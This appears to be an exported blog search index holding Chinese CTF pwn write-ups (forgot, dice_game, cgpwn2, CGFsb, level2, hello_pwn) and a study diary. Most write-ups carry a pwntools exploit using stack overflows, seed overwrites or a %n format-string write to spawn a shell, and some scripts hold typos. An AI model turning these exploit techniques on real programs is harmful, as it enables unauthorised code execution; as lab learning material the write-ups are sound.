keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token comment">#sh = remote("61.147.171.105", 59395)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">+</span> <span class="token string">b'1000'</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0x30303031</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'number'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过ctypes库来调用c函数生成随机数</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-forgot</title>
      <link href="/ctf-pwn/be50b3b8.html"/>
      <url>/ctf-pwn/be50b3b8.html</url>
      
        <content type="html"><![CDATA[<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720102348.png" style="zoom:50%;" />防护只开了不可执行。运行该程序，是一个邮件注册的东西。程序大致逻辑就是输入一个用户名，然后输入一个邮箱账号，然后对邮箱账号进行一个规范性检查，通过一个内嵌switch-case的循环实现，邮箱账号的每一个进行匹配检查<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720102750.png" style="zoom:50%;" /><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720102812.png" style="zoom:50%;" />在main函数结尾处有一个函数指针，执行v3数组里的函数<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720102933.png" style="zoom:50%;" />v3数组里面是相应的puts输出函数。在该程序中存在有现成的system  cat flag的函数<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720103051.png" style="zoom:50%;" />又存在scanf函数，存在溢出点，且v3与输入的邮箱账号在同一个栈中，考虑通过修改v3数组，使其指向spawn函数<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720103322.png" style="zoom:80%;" />input_name的长度为32，用32个“a”填充后，从for循环中跳出来后flag_value的值为2，对应到最后的函数指针上，会执行v3数组中第二个元素，也就是说spawn函数的地址要填充到v3的第二个元素处，v3每个元素的类型为dword，因此还需要填充4个字符，在填充spawn的地址构造的payload为`payload = b'a' * 36 + p32(spawn_addr`完整exp如下：<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>pwn_addr <span class="token operator">=</span> <span class="token number">0x80486cc</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">36</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pwn_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"What is your name?\n"</span><span class="token punctuation">,</span> <span class="token string">b'aaaa'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter the string to be validate"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-dic_game</title>
      <link href="/ctf-pwn/7551b35e.html"/>
      <url>/ctf-pwn/7551b35e.html</url>
      
        <content type="html"><![CDATA[<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718102541.png"  style="zoom:50%;" /><p>关于elf文件结构<br>.got全局偏移表<br>.plt程序链接表</p><p>#覆盖随机数种子</p><p>又是一个猜数游戏，checksec如下<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718141443.png"  style="zoom:50%;" /></p><p>存在溢出函数read，用time来作为当前的随机数种子<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718141653.png"  style="zoom:50%;" /><br>在sub_556DF3600A20中，v1为输入的数，v2为随机数，如果相等则win，返回1<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142043.png" style="zoom:50%;" /></p><p>当50次都输入正确是，进入sub_556DF3600B28函数，该函数将输出flag<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142153.png"  style="zoom:50%;" /></p><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142228.png"  style="zoom:50%;" /><p>因此，只要能知道随机数种子就可以预测每一次的数字，从而获得flag。<br>存在的溢出点read函数则可以帮助实现。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142424.png"  style="zoom:50%;" /><br>buf的大小为55，而read分配的空间为0x50，也就是80，buf在栈中到seed的偏移为64。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142544.png"  style="zoom:50%;" /><br> 通过输入name进行溢出覆盖到seed，使得seed可控，从而可预测出随机数</p><p>利用exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0x30303031</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">64</span> <span class="token operator">+</span> <span class="token string">b'1000'</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Welcome, let me know your name:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Give me the point(1~6):"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[[攻防世界pwn-guess_num]]</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-cgpwn2</title>
      <link href="/ctf-pwn/ee66d7d5.html"/>
      <url>/ctf-pwn/ee66d7d5.html</url>
      
        <content type="html"><![CDATA[<p>没有开启任何防护<br>存在system函数，存在gets函数可溢出<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230715151040.png" style="zoom:50%;" /></p><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230715151024.png" style="zoom:50%;" />要getshell的话需要构造“/bin/sh”参数，但是本身并没有这个字符串，因此可以在输入name时，输入“/bin/sh"，然后在构造payload时将”/bin/sh"的地址写入<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>sys_addr <span class="token operator">=</span> <span class="token number">0x804855A</span>name <span class="token operator">=</span> <span class="token string">b'/bin/sh'</span>name_addr <span class="token operator">=</span> <span class="token number">0x804A080</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x26</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please tell me your name'</span><span class="token punctuation">,</span> name <span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'hello,you can leave some message here:'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[[攻防世界pwn-string]]</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-CGFsb</title>
      <link href="/ctf-pwn/4b131921.html"/>
      <url>/ctf-pwn/4b131921.html</url>
      
        <content type="html"><![CDATA[<p>canary保护机制<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230713084732.png" style="zoom:50%;" /><br>在函数入口处，会从gs寄存器上取一个值存放到栈上，在函数退出时会去检查栈中的这个值是否发生变化。<br>存在printf函数，可以通过偏移泄漏出canary的值<br>格式化字符串漏洞，通过%n来修改参数的值<br><a href="https://bbs.kanxue.com/thread-253638.htm">[原创]格式化字符串漏洞简介-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p><p><code>%n</code>计算字符个数</p><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230713163639.png" style="zoom:50%;" /><p>pwn CGfsb</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">55756</span><span class="token punctuation">)</span><span class="token comment"># sh = process("./e41a0f684d0e497f87bb309f91737e4d")</span>pwnme_addr <span class="token operator">=</span> <span class="token number">0x804A068</span><span class="token comment"># canary_addr = b"%35$p" #可以泄漏出canary的值 </span>payload1 <span class="token operator">=</span> p32<span class="token punctuation">(</span>pwnme_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token string">b'%10$n'</span> <span class="token comment">#利用%n，将pwnme处的值重写</span><span class="token comment"># gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"please tell me your name:\n"</span><span class="token punctuation">,</span> <span class="token string">b'aaa'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"leave your message please:\n"</span><span class="token punctuation">,</span> payload1 <span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[[攻防世界pwn-mary-morton]]</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-level2</title>
      <link href="/ctf-pwn/6d0f7c20.html"/>
      <url>/ctf-pwn/6d0f7c20.html</url>
      
        <content type="html"><![CDATA[<p>存在溢出点<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230707221748.png" style="zoom:50%;" /><br>存在system调用，以及字符”&#x2F;bin&#x2F;sh”，可以构造返回地址到 system调用，但是如何将“&#x2F;bin&#x2F;sh”参数写入。<br>根据函数调用约定写入覆盖内容1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>sys_addr <span class="token operator">=</span> <span class="token number">0x8048320</span>binsh <span class="token operator">=</span> <span class="token number">0x804A024</span>whaterver_addr <span class="token operator">=</span> <span class="token number">0xcacacaca</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>whatever_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'cat flag'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数调用格式</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-hello_pwn</title>
      <link href="/ctf-pwn/7d1de980.html"/>
      <url>/ctf-pwn/7d1de980.html</url>
      
        <content type="html"><![CDATA[<p>参数覆盖 <strong>小端存储</strong><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230706222328.png" style="zoom: 50%;" /><br>两个函数参数相差4<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230706222443.png" style="zoom:50%;" /></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">-</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token string">b'aaun'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天天向上</title>
      <link href="/undefined/7ed5fe30.html"/>
      <url>/undefined/7ed5fe30.html</url>
      
        <content type="html"><![CDATA[<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><h2 id="09-14"><a href="#09-14" class="headerlink" title="09.14"></a>09.14</h2><p><a href="http://blog.yangsx.cn/ctf-pwn/4ae9b482.html">攻防世界pwn-time_formatter | 小哑师兄</a></p><p>今天开始接触到pwn堆题了, 要学的东西好多. 希望自己每天能好好学习, 学习状态还是不好, 对自己太放松了, 要好好自驱.</p><h2 id="09-11-09-12"><a href="#09-11-09-12" class="headerlink" title="09.11-09.12"></a>09.11-09.12</h2><p><a href="http://blog.yangsx.cn/ctf-pwn/eabc8e5d.html">攻防世界pwn-welpwn | 小哑师兄</a></p><p><a href="http://blog.yangsx.cn/ctf-pwn/3979423f.html">攻防世界pwn-pwnstack | 小哑师兄</a></p><h2 id="09-06-09-07"><a href="#09-06-09-07" class="headerlink" title="09.06-09.07"></a>09.06-09.07</h2><p>参加公司培训</p><h2 id="09-05"><a href="#09-05" class="headerlink" title="09.05"></a>09.05</h2><p><a href="http://blog.yangsx.cn/ctf-pwn/7654e13.html">攻防世界pwn-pwn200 | 小哑师兄</a></p><p><a href="http://blog.yangsx.cn/ctf-pwn/31354e41.html">攻防世界pwn-实时数据监测 | 小哑师兄</a></p><h2 id="09-04"><a href="#09-04" class="headerlink" title="09.04"></a>09.04</h2><p><a href="https://blog.yangsx.cn/ctf-pwn/c42410d2.html">攻防世界pwn-反应釜 | 小哑师兄 (yangsx.cn)</a></p><h2 id="09-02"><a href="#09-02" class="headerlink" title="09.02"></a>09.02</h2><p><a href="https://blog.yangsx.cn/ctf-pwn/1bdd2aa8.html">攻防世界pwn-pwn1 | 小哑师兄 (yangsx.cn)</a></p><h2 id="08-31"><a href="#08-31" class="headerlink" title="08.31"></a>08.31</h2><p>八月的最后一天看了点got利用的pwn, got和plt也理解了, 但是在pwn中的利用还是不太会, 怎么去泄漏地址还没掌握.</p><p>整个八月的成长不是很大, 希望自己接下来真的能静下心来去学习去提升自己.</p><h2 id="08-25-08-27"><a href="#08-25-08-27" class="headerlink" title="08.25-08.27"></a>08.25-08.27</h2><p>周六日好好休息了下, 顺带补网络的基础知识. 28, 29因为外出工作摸不到电脑, 搁置了.</p><h2 id="08-24"><a href="#08-24" class="headerlink" title="08.24"></a>08.24</h2><p>今天就是G, 本来今天调休, 结果另有工作安排, 然后对接工作的人快要下班的时候才来交东西加班到比较晚才下班. 在此期间只能像个木头一样干熬. 😅</p><h2 id="08-23"><a href="#08-23" class="headerlink" title="08.23"></a>08.23</h2><p>又去看plt和got表, Linux的知识储备太少了. 攻防世界做pwn题, 没弄完. HW最后一天杂事比较多, 第一次HW, 也是以甲方身份参加, 很多活都是乙方的, 自己感受不是那么深</p><h2 id="08-22"><a href="#08-22" class="headerlink" title="08.22"></a>08.22</h2><p>正好不是我的班, 开开心心去找对象玩了</p><h2 id="08-21"><a href="#08-21" class="headerlink" title="08.21"></a>08.21</h2><p>今天下午鼓捣了博客 尝试腾讯serverless部署博客, 访问很快, 但是需要cdn绑定到自己的域名. 复现qq的rce, 就大佬不知道咋挖出来的. 尝试给博客搞google收录, 但是google一直读不到sitemap, 其他检测网站可以正常读取. </p><h2 id="07-20-08-20"><a href="#07-20-08-20" class="headerlink" title="07.20-08.20"></a>07.20-08.20</h2><p>陆陆续续在刷攻防世界的pwn,但整体效率不高</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
